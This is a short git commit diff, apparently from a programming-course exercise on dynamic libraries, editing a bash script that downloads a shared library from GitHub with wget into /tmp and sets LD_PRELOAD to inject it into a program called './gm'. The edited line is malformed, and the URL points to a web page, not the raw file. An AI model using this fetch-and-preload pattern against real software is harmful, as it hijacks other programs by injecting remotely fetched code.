e0df1a417adc232184e7a35bfc2407e41853a0fb
Hucksapp <hucksapp@gmail.com>
2023-12-18 12:13:16 -0800

    hack

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 wget -O /tmp/printhack.so https://github.com/HucksApp/alx-low_level_programming/blob/main/0x18-dynamic_libraries/printhack.so
-export LD_PRELOAD=/tmp/printhack.so
+export LD_PRELOAD=/tmp/printhack.so ./gm
